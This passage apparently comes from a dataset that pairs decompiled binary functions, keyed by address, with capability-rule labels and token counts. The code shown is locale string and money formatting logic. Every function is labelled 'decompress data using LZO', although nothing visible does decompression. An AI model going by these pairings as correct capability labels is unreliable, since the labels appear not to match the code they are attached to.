var_70h - var_2ch, arg_14h);\n                }\n            }\n            if (var_65h == 0) {\n                uVar16 = (**(*arg_8h + 0x30))(var_30h, var_70h);\n                var_65h = var_70h != uVar16;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004a34c0(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004a34c0(var_48h);\n            }\ncode_r0x00441ee6:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(piVar13 + 0x11);\n        uVar1 = var_44h + 1;\n        uVar8 = 0xf;\n        if (var_48h != &var_40h) {\n            uVar8 = var_40h;\n        }\n        if (uVar8 < uVar1) {\n            fcn.00492830(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar17) = uVar3;\n        *(var_48h + uVar1) = 0;\n        var_44h = uVar1;\n        if (var_70h < 0) {\n            fcn.00490f00(uVar1, 0, -var_70h, *(piVar13 + 0x39));\n            if (0x7fffffff - var_44h < uVar16) goto code_r0x00442538;\n            fcn.00492660(puVar14, uVar16);\n            goto code_r0x00441fdf;\n        }\n        if (piVar13[0xb] <= 0x7fffffff - uVar1) {\n            fcn.00492660(puVar14 + var_70h, piVar13[0xb]);\n            goto code_r0x00441fdf;\n        }\n        fcn.0049ec30(0x5025f4);\ncode_r0x00442504:\n        fcn.0049ec30(0x5025f4);\n    }\n    else {\n        if (iVar4 < 0) {\n            var_70h = uVar16;\n        }\n        if (piVar13[3] == 0) {\n            fcn.004906f0(0, var_44h, puVar14, var_70h);\n            iVar4 = piVar13[0xb];\n            goto code_r0x00441fd1;\n        }\n        fcn.00490f00(0, var_44h, var_70h * 2, 0);\n        puVar7 = fcn.0049d950(var_48h, *(piVar13 + 0x12), piVar13[2], piVar13[3], puVar14, puVar14 + var_70h);\n        if (puVar7 - var_48h <= var_44h) {\n            *puVar7 = 0;\n            iVar4 = piVar13[0xb];\n            var_44h = puVar7 - var_48h;\n            goto code_r0x00441fd1;\n        }\n    }\n    fcn.0049f220(0x502628, 0x502611);\ncode_r0x0044252c:\n    fcn.0049ec30(0x5025f4);\ncode_r0x00442538:\n    uVar10 = fcn.0049ec30(0x5025f4);\n    fcn.004a36d0(uVar10);\n    do {\n        uVar10 = fcn.004a3b60();\n        fcn.004a36d0(uVar10);\n        (**(*piVar13 + 4))();\n    } while( true );\n}\n",
        "token_count": 2951
    },
    "004425b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.004425b0(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uint8_t *puVar11;\n    bool bVar12;\n    int32_t *piVar13;\n    uint8_t *puVar14;\n    uint *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    char *var_7ch;\n    uint var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    iVar4 = fcn.004a0a80(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    ppiVar2 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    piVar13 = *ppiVar2;\n    if (piVar13 == NULL) {\n        puVar15 = fcn.004a3500(0x44);\n        *puVar15 = 0x50af24;\n        *(puVar15 + 4) = 0;\n        puVar15[1] = 0;\n        puVar15[2] = 0;\n        puVar15[3] = 0;\n        *(puVar15 + 0x12) = 0;\n        puVar15[5] = 0;\n        puVar15[6] = 0;\n        puVar15[7] = 0;\n        puVar15[8] = 0;\n        puVar15[9] = 0;\n        puVar15[10] = 0;\n        puVar15[0xb] = 0;\n        puVar15[0xc] = 0;\n        puVar15[0xd] = 0;\n        *(puVar15 + 0x43) = 0;\n        fcn.0048aa30(arg_10h + 0x6c);\n        fcn.0048da50(puVar15, iVar5);\n        piVar13 = *ppiVar2;\n    }\n    puVar14 = *arg_18h;\n    if (*puVar14 == *(piVar13 + 0xe)) {\n        var_4ch = piVar13[0xd];\n        if (arg_18h[1] == NULL) goto code_r0x00442666;\n        var_7ch = piVar13[9];\n        puVar14 = puVar14 + 1;\n        var_74h = piVar13[10];\n    }\n    else {\n        var_4ch = piVar13[0xc];\n        var_7ch = piVar13[7];\n        var_74h = piVar13[8];\n    }\n    puVar11 = arg_18h[1] + puVar14;\n    if ((puVar11 <= puVar14) || (puVar6 = puVar14,  (*(*(iVar4 + 0x18) + *puVar14 * 2) & 8) == 0))\n    goto code_r0x00442666;\n    do {\n        puVar6 = puVar6 + 1;\n        if (puVar11 == puVar6) {\n            uVar16 = puVar11 - puVar14;\n            goto joined_r0x00442696;\n        }\n    } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n    uVar16 = puVar6 - puVar14;\njoined_r0x00442696:\n    if (uVar16 == 0) goto code_r0x00442666;\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h = var_40h & 0xffffff00;\n    fcn.004924e0(uVar16 * 2);\n    iVar4 = piVar13[0xb];\n    var_70h = uVar16 - iVar4;\n    if (var_70h < 1) {\ncode_r0x00442751:\n        uVar17 = var_44h;\n        if (iVar4 < 1) {\ncode_r0x0044275f:\n            uVar17 = var_44h + var_74h;\n            uVar16 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar17 = uVar17 + piVar13[6];\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffffff00;\n            fcn.004924e0(uVar17 * 2);\n            puVar15 = &var_4ch;\n            var_70h = *(arg_10h + 8);\n            bVar12 = uVar16 == 0x10 && uVar17 < var_70h;\n            do {\n                uVar1 = var_2ch;\n                if (*puVar15 < 5) {\n    // switch table (5 cases) at 0x502660\n                    switch(*puVar15) {\n                    case 0:\n                        if (bVar12) {\n                            fcn.00490f00(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar12) {\n                            fcn.00490f00(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        else {\n                            uVar8 = var_2ch + 1;\n                            uVar9 = 0xf;\n                            if (var_30h != &var_28h) {\n                                uVar9 = var_28h;\n                            }\n                            if (uVar9 < uVar8) {\n                                fcn.00492830(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar1) = arg_14h;\n                            *(var_30h + uVar1 + 1) = 0;\n                            var_2ch = uVar8;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x7fffffff - var_2ch < piVar13[6]) goto code_r0x00442cac;\n                            fcn.00492660(piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (var_74h != 0) {\n                            fcn.004929c0(*var_7ch);\n                        }\n                        break;\n                    case 4:\n                        fcn.00492660(var_48h, var_44h);\n                    }\n                }\n                puVar15 = puVar15 + 1;\n            } while (&var_48h != puVar15);\n            if (var_74h < 2) {\n                if (var_2ch < var_70h) goto code_r0x00442991;\ncode_r0x0044292c:\n                var_70h = var_2ch;\n            }\n            else {\n                piVar13 = 0x7fffffff - var_2ch;\n                if (piVar13 < var_74h - 1) goto code_r0x00442c84;\n                fcn.00492660(var_7ch + 1, var_74h - 1);\n                if (var_70h <= var_2ch) goto code_r0x0044292c;\ncode_r0x00442991:\n                if (uVar16 == 0x20) {\n                    fcn.00490f00(var_2ch, 0, var_70h - var_2ch, arg_14h);\n                }\n                else {\n                    fcn.00490f00(0, 0, var_70h - var_2ch, arg_14h);\n                }\n            }\n            if (var_65h == 0) {\n                uVar16 = (**(*arg_8h + 0x30))(var_30h, var_70h);\n                var_65h = var_70h != uVar16;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004a34c0(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004a34c0(var_48h);\n            }\ncode_r0x00442666:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(piVar13 + 0x11);\n        uVar1 = var_44h + 1;\n        uVar8 = 0xf;\n        if (var_48h != &var_40h) {\n            uVar8 = var_40h;\n        }\n        if (uVar8 < uVar1) {\n            fcn.00492830(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar17) = uVar3;\n        *(var_48h + uVar1) = 0;\n        var_44h = uVar1;\n        if (var_70h < 0) {\n            fcn.00490f00(uVar1, 0, -var_70h, *(piVar13 + 0x39));\n            if (0x7fffffff - var_44h < uVar16) goto code_r0x00442cb8;\n            fcn.00492660(puVar14, uVar16);\n            goto code_r0x0044275f;\n        }\n        if (piVar13[0xb] <= 0x7fffffff - uVar1) {\n            fcn.00492660(puVar14 + var_70h, piVar13[0xb]);\n            goto code_r0x0044275f;\n        }\n        fcn.0049ec30(0x5025f4);\ncode_r0x00442c84:\n        fcn.0049ec30(0x5025f4);\n    }\n    else {\n        if (iVar4 < 0) {\n            var_70h = uVar16;\n        }\n        if (piVar13[3] == 0) {\n            fcn.004906f0(0, var_44h, puVar14, var_70h);\n            iVar4 = piVar13[0xb];\n            goto code_r0x00442751;\n        }\n        fcn.00490f00(0, var_44h, var_70h * 2, 0);\n        puVar7 = fcn.0049d950(var_48h, *(piVar13 + 0x12), piVar13[2], piVar13[3], puVar14, puVar14 + var_70h);\n        if (puVar7 - var_48h <= var_44h) {\n            *puVar7 = 0;\n            iVar4 = piVar13[0xb];\n            var_44h = puVar7 - var_48h;\n            goto code_r0x00442751;\n        }\n    }\n    fcn.0049f220(0x502628, 0x502611);\ncode_r0x00442cac:\n    fcn.0049ec30(0x5025f4);\ncode_r0x00442cb8:\n    uVar10 = fcn.0049ec30(0x5025f4);\n    fcn.004a36d0(uVar10);\n    do {\n        uVar10 = fcn.004a3b60();\n        fcn.004a36d0(uVar10);\n        (**(*piVar13 + 4))();\n    } while( true );\n}\n",
        "token_count": 2949
    },
    "00442de0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00442de0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    unkbyte10 in_stack_00000018;\n    uint uStack132;\n    uint *puStack128;\n    uint32_t auStack124 [4];\n    unkbyte10 aStack108 [2];\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_4ch = arg_10h;\n    var_50h = arg_18h;\n    auStack124[0] = arg_14h + 0x6c;\n    puStack128 = 0x442e09;\n    fcn.0048f500();\n    puStack128 = &fcn.00442de0::var_34h;\n    uStack132 = 0x442e17;\n    var_44h = fcn.004a0ae0();\n    uStack132 = 0x442e24;\n    iVar2 = fcn.00418950();\n    iVar2 = -iVar2;\n    piVar6 = &stack0xffffff80 + iVar2;\n    uVar5 = &fcn.00442de0::var_50h + iVar2 + 3 & 0xfffffff0;\n    var_40h = uVar5;\n    *(&stack0xffffff7c + iVar2) = 0x442e35;\n    var_30h = fcn.0048f260();\n    *(&stack0xffffff90 + iVar2) = 0;\n    *(&stack0xffffff8c + iVar2) = 0x502944;\n    *(&stack0xffffff88 + iVar2) = 0x40;\n    *(&stack0xffffff94 + iVar2) = in_stack_00000018;\n    *(&stack0xffffff84 + iVar2) = uVar5;\n    *(&stack0xffffff80 + iVar2) = &fcn.00442de0::var_30h;\n    *(&stack0xffffff7c + iVar2) = 0x442e66;\n    iVar3 = fcn.0049df90();\n    if (0x3f < iVar3) {\n        *(&stack0xffffff7c + iVar2) = 0x442e7e;\n        iVar4 = fcn.00418950();\n        iVar4 = -iVar4;\n        piVar6 = &stack0xffffff80 + iVar4 + iVar2;\n        uVar5 = &fcn.00442de0::var_50h + iVar4 + iVar2 + 3 & 0xfffffff0;\n        var_40h = uVar5;\n        *(&stack0xffffff7c + iVar4 + iVar2) = 0x442e8f;\n        var_30h = fcn.0048f260();\n        *(&stack0xffffff90 + iVar4 + iVar2) = 0;\n        *(&stack0xffffff8c + iVar4 + iVar2) = 0x502944;\n        *(&stack0xffffff88 + iVar4 + iVar2) = iVar3 + 1;\n        *(&stack0xffffff94 + iVar4 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4 + iVar2) = uVar5;\n        *(&stack0xffffff80 + iVar4 + iVar2) = &fcn.00442de0::var_30h;\n        *(&stack0xffffff7c + iVar4 + iVar2) = 0x442eb9;\n        iVar3 = fcn.0049df90();\n    }\n    piVar6[1] = 0;\n    *piVar6 = iVar3;\n    var_30h = &fcn.00442de0::var_28h;\n    piVar6[-1] = 0x442ed3;\n    fcn.004937f0();\n    iVar2 = *var_44h;\n    *piVar6 = var_30h;\n    iVar3 = iVar3 + var_40h;\n    piVar6[-2] = var_40h;\n    piVar6[-1] = iVar3;\n    pcVar1 = *(iVar2 + 0x2c);\n    puVar7 = piVar6 + -3;\n    piVar6[-3] = 0x442ef1;\n    (*pcVar1)();\n    uVar5 = var_50h & 0xffff;\n    puVar7[1] = &fcn.00442de0::var_30h;\n    *puVar7 = uVar5;\n    puVar7[-2] = arg_ch;\n    puVar7[-1] = arg_14h;\n    puVar7[-3] = arg_8h;\n    if (var_4ch == '\\0') {\n        puVar7[-4] = 0x442f65;\n        _var_40h = fcn.00442f90(puVar7[-3], puVar7[-2], puVar7[-1], *puVar7, puVar7[1]);\n    }\n    else {\n        puVar7[-4] = 0x442f22;\n        _var_40h = fcn.00443770(puVar7[-3], puVar7[-2], puVar7[-1], *puVar7, puVar7[1]);\n    }\n    if (var_30h != &fcn.00442de0::var_28h) {\n        puVar7[-8] = var_30h;\n        var_40h = _var_40h;\n        var_3ch = _var_40h >> 0x20;\n        puVar7[-9] = 0x442f3a;\n        fcn.004a34c0();\n    }\n    var_40h = _var_40h;\n    var_3ch = _var_40h >> 0x20;\n    puVar7[-9] = 0x442f4e;\n    fcn.0048f620();\n    return _var_40h;\n}\n",
        "token_count": 1486
    },
    "00442f90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl fcn.00442f90(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    ushort *puVar6;\n    int32_t *piVar7;\n    uint32_t extraout_ECX;\n    bool bVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t extraout_EDX;\n    int32_t iVar11;\n    int16_t *piVar12;\n    uint *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint uVar16;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    ushort *var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    piVar4 = fcn.004a0ae0(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar13 = fcn.004a3500(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x50af34;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.0048b110(arg_10h + 0x6c);\n        fcn.0048da50(puVar13, iVar5);\n        iVar11 = *piVar7;\n    }\n    piVar12 = *arg_18h;\n    if (*piVar12 == *(iVar11 + 0x3c)) {\n        var_4ch = *(iVar11 + 0x38);\n        var_78h = *(iVar11 + 0x28);\n        var_70h = *(iVar11 + 0x2c);\n        if (arg_18h[1] != NULL) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        var_4ch = *(iVar11 + 0x34);\n        var_70h = *(iVar11 + 0x24);\n        var_78h = *(iVar11 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar12, piVar12 + arg_18h[1]);\n    uVar14 = iVar5 - piVar12 >> 1;\n    if (uVar14 == 0) goto code_r0x00443037;\n    var_48h = &var_40h;\n    var_40h = var_40h._2_2_ << 0x10;\n    var_44h = 0;\n    fcn.00495350(iVar5 - piVar12);\n    iVar5 = *(iVar11 + 0x30);\n    var_80h = uVar14 - iVar5;\n    if (var_80h < 1) {\ncode_r0x0044314a:\n        uVar15 = var_44h;\n        if (iVar5 < 1) {\ncode_r0x00443152:\n            uVar15 = var_44h + var_70h;\n            uVar14 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar15 = uVar15 + *(iVar11 + 0x1c);\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffff0000;\n            fcn.00495350(uVar15 * 2);\n            puVar13 = &var_4ch;\n            uVar9 = *(arg_10h + 8);\n            bVar8 = uVar14 == 0x10 && uVar15 < uVar9;\n            do {\n                uVar2 = var_2ch;\n                if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x502930\n                    switch(*puVar13) {\n                    case 0:\n                        if (bVar8) {\n                            fcn.00493c70(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar8) {\n                            fcn.00493c70(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        else {\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004956c0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = arg_14h;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x3fffffff - var_2ch < *(iVar11 + 0x1c)) goto code_r0x004436cb;\n                            fcn.004954e0(*(iVar11 + 0x18), *(iVar11 + 0x1c));\n                        }\n                        break;\n                    case 3:\n                        if (var_70h != 0) {\n                            uVar3 = *var_78h;\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004956c0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = uVar3;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 4:\n                        fcn.004954e0(var_48h, var_44h);\n                    }\n                }\n                puVar13 = puVar13 + 1;\n            } while (&var_48h != puVar13);\n            var_74h = var_2ch;\n            if (1 < var_70h) {\n                if (0x3fffffff - var_2ch < var_70h - 1) goto code_r0x004436d7;\n                fcn.004954e0(var_78h + 1, var_70h - 1);\n                var_74h = var_2ch;\n            }\n            var_2ch = var_74h;\n            if (var_74h < uVar9) {\n                if (uVar14 == 0x20) {\n                    fcn.00493c70(var_74h, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n                else {\n                    fcn.00493c70(0, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n            }\n            if (var_65h == 0) {\n                uVar14 = (**(*arg_8h + 0x30))(var_30h, var_74h);\n                var_65h = uVar14 != var_74h;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004a34c0(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004a34c0(var_48h);\n            }\ncode_r0x00443037:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(iVar11 + 0x12);\n        uVar2 = var_44h + 1;\n        uVar9 = 7;\n        if (var_48h != &var_40h) {\n            uVar9 = var_40h;\n        }\n        if (uVar9 < uVar2) {\n            fcn.004956c0(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar15 * 2) = uVar3;\n        *(var_48h + uVar15 * 2 + 2) = 0;\n        var_44h = uVar2;\n        if (var_80h < 0) {\n            uVar15 = *(iVar11 + 0x3e);\n            uVar16 = 0;\n            uVar9 = -var_80h;\n            fcn.00493c70(uVar2, 0, uVar9, uVar15);\n            if (0x3fffffff - var_44h < uVar14) goto code_r0x004436ff;\n            fcn.004954e0(piVar12, uVar14);\n            goto code_r0x00443152;\n        }\n        if (*(iVar11 + 0x30) <= 0x3fffffff - uVar2) {\n            fcn.004954e0(piVar12 + var_80h, *(iVar11 + 0x30));\n            goto code_r0x00443152;\n        }\n        fcn.0049ec30(0x5028b0);\ncode_r0x004436cb:\n        fcn.0049ec30(0x5028b0);\ncode_r0x004436d7:\n        fcn.0049ec30(0x5028b0);\n        uVar15 = extraout_ECX;\n        uVar9 = extraout_EDX;\n    }\n    else {\n        if (iVar5 < 0) {\n            var_80h = uVar14;\n        }\n        if (*(iVar11 + 0xc) == 0) {\n            fcn.00493470(0, var_44h, piVar12, var_80h);\n            iVar5 = *(iVar11 + 0x30);\n            goto code_r0x0044314a;\n        }\n        fcn.00493c70(0, var_44h, var_80h * 2, 0);\n        puVar6 = fcn.0049dab0(var_48h, *(iVar11 + 0x14), *(iVar11 + 8), *(iVar11 + 0xc), piVar12, piVar12 + var_80h);\n        uVar9 = puVar6 - var_48h >> 1;\n        uVar15 = var_44h;\n        if (uVar9 <= var_44h) {\n            *puVar6 = 0;\n            iVar5 = *(iVar11 + 0x30);\n            var_44h = uVar9;\n            goto code_r0x0044314a;\n        }\n    }\n    uVar16 = 0x5028cd;\n    fcn.0049f220(0x5028e4, 0x5028cd);\ncode_r0x004436ff:\n    piVar7 = fcn.0049ec30(0x5028b0, uVar16, uVar9, uVar15);\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    uVar16 = fcn.0041b360(piVar7);\n    fcn.004a36d0(uVar16);\n    (**(*piVar7 + 4))();\n    do {\n        uVar16 = fcn.004a3b60();\n        fcn.004a36d0(uVar16);\n    } while( true );\n}\n",
        "token_count": 3133
    },
    "00443770": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl fcn.00443770(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    ushort *puVar6;\n    int32_t *piVar7;\n    uint32_t extraout_ECX;\n    bool bVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t extraout_EDX;\n    int32_t iVar11;\n    int16_t *piVar12;\n    uint *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint uVar16;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    ushort *var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    piVar4 = fcn.004a0ae0(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar13 = fcn.004a3500(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x50af44;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.0048b930(arg_10h + 0x6c);\n        fcn.0048da50(puVar13, iVar5);\n        iVar11 = *piVar7;\n    }\n    piVar12 = *arg_18h;\n    if (*piVar12 == *(iVar11 + 0x3c)) {\n        var_4ch = *(iVar11 + 0x38);\n        var_78h = *(iVar11 + 0x28);\n        var_70h = *(iVar11 + 0x2c);\n        if (arg_18h[1] != NULL) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        var_4ch = *(iVar11 + 0x34);\n        var_70h = *(iVar11 + 0x24);\n        var_78h = *(iVar11 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar12, piVar12 + arg_18h[1]);\n    uVar14 = iVar5 - piVar12 >> 1;\n    if (uVar14 == 0) goto code_r0x00443817;\n    var_48h = &var_40h;\n    var_40h = var_40h._2_2_ << 0x10;\n    var_44h = 0;\n    fcn.00495350(iVar5 - piVar12);\n    iVar5 = *(iVar11 + 0x30);\n    var_80h = uVar14 - iVar5;\n    if (var_80h < 1) {\ncode_r0x0044392a:\n        uVar15 = var_44h;\n        if (iVar5 < 1) {\ncode_r0x00443932:\n            uVar15 = var_44h + var_70h;\n            uVar14 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar15 = uVar15 + *(iVar11 + 0x1c);\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffff0000;\n            fcn.00495350(uVar15 * 2);\n            puVar13 = &var_4ch;\n            uVar9 = *(arg_10h + 8);\n            bVar8 = uVar14 == 0x10 && uVar15 < uVar9;\n            do {\n                uVar2 = var_2ch;\n                if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x50291c\n                    switch(*puVar13) {\n                    case 0:\n                        if (bVar8) {\n                            fcn.00493c70(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar8) {\n                            fcn.00493c70(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        else {\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004956c0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = arg_14h;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x3fffffff - var_2ch < *(iVar11 + 0x1c)) goto code_r0x00443eab;\n                            fcn.004954e0(*(iVar11 + 0x18), *(iVar11 + 0x1c));\n                        }\n                        break;\n                    case 3:\n                        if (var_70h != 0) {\n                            uVar3 = *var_78h;\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004956c0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = uVar3;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 4:\n                        fcn.004954e0(var_48h, var_44h);\n                    }\n                }\n                puVar13 = puVar13 + 1;\n            } while (&var_48h != puVar13);\n            var_74h = var_2ch;\n            if (1 < 